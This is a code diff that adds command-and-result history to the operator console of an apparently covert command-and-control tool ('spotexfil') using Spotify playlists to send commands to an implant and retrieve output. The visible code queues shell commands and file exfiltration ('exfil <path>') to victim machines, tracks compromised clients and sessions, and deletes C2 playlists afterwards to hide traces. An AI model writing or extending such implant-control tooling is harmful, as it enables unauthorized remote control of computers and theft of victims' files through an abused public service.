@@ -30,6 +30,19 @@ type ClientInfo struct {
 	SessionID   string
 }
 
+// HistoryEntry records a command and its result.
+type HistoryEntry struct {
+	Seq       int       `json:"seq"`
+	ClientID  string    `json:"client_id"`
+	SessionID string    `json:"session_id"`
+	Module    string    `json:"module"`
+	Command   string    `json:"command"`
+	Status    string    `json:"status,omitempty"`
+	Result    string    `json:"result,omitempty"`
+	SentAt    time.Time `json:"sent_at"`
+	RecvAt    time.Time `json:"recv_at,omitempty"`
+}
+
 // Operator sends commands and retrieves results.
 type Operator struct {
 	client           *spotify.Client
@@ -41,6 +54,8 @@ type Operator struct {
 	lastPoll         time.Time             // timestamp of last successful poll
 	pollInterval     time.Duration         // background poll interval
 	attachedClient   string                // currently attached client_id ("" = none)
+	history          []HistoryEntry        // command/result history
+	historyFile      string                // path to persist history
 
 	// Forward secrecy via X25519
 	ephPriv        *ecdh.PrivateKey
@@ -68,7 +83,12 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 		fmt.Printf("[*] X25519 pubkey: %s\n", hex.EncodeToString(ephPub.Bytes()))
 	}
 
-	return &Operator{
+	histFile := ".spotexfil-history.json"
+	if home, err := os.UserHomeDir(); err == nil {
+		histFile = home + "/.spotexfil-history.json"
+	}
+
+	op := &Operator{
 		client:           client,
 		key:              key,
 		nextSeq:          1,
@@ -79,7 +99,10 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 		ephPub:           ephPub,
 		sessionKeys:      make(map[string][]byte),
 		pendingKeys:      make(map[string][]byte),
+		historyFile:      histFile,
 	}
+	op.loadHistory()
+	return op
 }
 
 // SendCommand queues a command for the implant.
@@ -130,6 +153,18 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 	}
 
 	op.pendingSeqs[seq] = module
+
+	// Record in history
+	cmdStr := module
+	if args != nil {
+		if cmd, ok := args["cmd"].(string); ok {
+			cmdStr = cmd
+		} else if path, ok := args["path"].(string); ok {
+			cmdStr = "exfil " + path
+		}
+	}
+	op.recordCommand(seq, module, cmdStr)
+
 	fmt.Printf("[*] Command queued: seq=%d module=%s\n", seq, module)
 	return seq, nil
 }
@@ -193,6 +228,10 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 			continue
 		}
 		results[seqNum] = result
+		// Record result in history
+		status, _ := result["status"].(string)
+		data, _ := result["data"].(string)
+		op.recordResult(seqNum, status, data)
 		_ = op.client.CleanC2Playlists(ctx,
 			protocol.ChannelRes, op.key, seqNum)
 		delete(op.pendingSeqs, seqNum)
@@ -413,6 +452,14 @@ func (op *Operator) Interactive() {
 			if result != nil {
 				displayResult(seqNum, result)
 			}
+		case "history", "shellhist":
+			op.printHistory()
+		case "result":
+			if arg == "" {
+				fmt.Println("[!] Usage: result <seq>")
+				continue
+			}
+			op.showResult(arg)
 		case "clean":
 			op.cleanAll()
 		case "status":
@@ -878,6 +925,10 @@ Commands (requires attached agent):
   exfil <path>    Exfiltrate a file
   sysinfo         Gather system info
 
+History:
+  history         Show command history for current session
+  result <seq>    Show result for a specific seq number
+
 Other:
   results         Poll for pending results
   wait <seq>      Wait for a specific result
@@ -885,4 +936,122 @@ Other:
   clean           Remove all C2 playlists
   help            Show this help
   quit / exit     Exit the console`)
+}
+
+// --- History ---
+
+func (op *Operator) loadHistory() {
+	data, err := os.ReadFile(op.historyFile)
+	if err != nil {
+		return
+	}
+	_ = json.Unmarshal(data, &op.history)
+}
+
+func (op *Operator) saveHistory() {
+	data, _ := json.MarshalIndent(op.history, "", "  ")
+	_ = os.WriteFile(op.historyFile, data, 0600)
+}
+
+func (op *Operator) recordCommand(seq int, module, command string) {
+	clientID := op.attachedClient
+	sessionID := ""
+	if info, ok := op.connectedClients[clientID]; ok {
+		sessionID = info.SessionID
+	}
+	op.history = append(op.history, HistoryEntry{
+		Seq:       seq,
+		ClientID:  clientID,
+		SessionID: sessionID,
+		Module:    module,
+		Command:   command,
+		SentAt:    time.Now(),
+	})
+	op.saveHistory()
+}
+
+func (op *Operator) recordResult(seq int, status, data string) {
+	for i := len(op.history) - 1; i >= 0; i-- {
+		if op.history[i].Seq == seq && op.history[i].Status == "" {
+			op.history[i].Status = status
+			op.history[i].Result = data
+			op.history[i].RecvAt = time.Now()
+			op.saveHistory()
+			return
+		}
+	}
+}
+
+func (op *Operator) printHistory() {
+	if len(op.history) == 0 {
+		fmt.Println("[*] No command history")
+		return
+	}
+
+	// Show last 20 entries
+	start := 0
+	if len(op.history) > 20 {
+		start = len(op.history) - 20
+	}
+
+	fmt.Printf("\n  %-5s %-10s %-12s %-10s %-6s %s\n",
+		"SEQ", "CLIENT", "SESSION", "MODULE", "STATUS", "COMMAND")
+	fmt.Printf("  %-5s %-10s %-12s %-10s %-6s %s\n",
+		"-----", "----------", "------------", "----------", "------",
+		"--------------------")
+
+	for _, h := range op.history[start:] {
+		cid := h.ClientID
+		if len(cid) > 8 {
+			cid = cid[:8]
+		}
+		sid := h.SessionID
+		if len(sid) > 10 {
+			sid = sid[:10]
+		}
+		status := h.Status
+		if status == "" {
+			status = "\033[33mpending\033[0m"
+		} else if status == "ok" {
+			status = "\033[32mok\033[0m"
+		} else {
+			status = "\033[31m" + status + "\033[0m"
+		}
+		cmd := h.Command
+		if len(cmd) > 40 {
+			cmd = cmd[:37] + "..."
+		}
+		fmt.Printf("  %-5d %-10s %-12s %-10s %-6s %s\n",
+			h.Seq, cid, sid, h.Module, status, cmd)
+	}
+	fmt.Println()
+}
+
+func (op *Operator) showResult(seqStr string) {
+	seqNum, err := strconv.Atoi(seqStr)
+	if err != nil {
+		fmt.Println("[!] Usage: result <seq>")
+		return
+	}
+
+	for i := len(op.history) - 1; i >= 0; i-- {
+		if op.history[i].Seq == seqNum {
+			h := op.history[i]
+			fmt.Printf("\n--- seq=%d [%s] %s ---\n", h.Seq, h.Module, h.Command)
+			fmt.Printf("  client  : %s\n", h.ClientID[:8])
+			fmt.Printf("  sent    : %s\n", h.SentAt.Format("2006-01-02 15:04:05"))
+			if h.Status != "" {
+				fmt.Printf("  status  : %s\n", h.Status)
+				fmt.Printf("  recv    : %s\n", h.RecvAt.Format("2006-01-02 15:04:05"))
+				fmt.Printf("  latency : %s\n", h.RecvAt.Sub(h.SentAt).Truncate(time.Second))
+				fmt.Println("  output  :")
+				fmt.Println(h.Result)
+			} else {
+				fmt.Println("  status  : pending (no result yet)")
+			}
+			fmt.Println("---")
+			return
+		}
+	}
+	fmt.Printf("[!] No history for seq=%d\n", seqNum)
 }
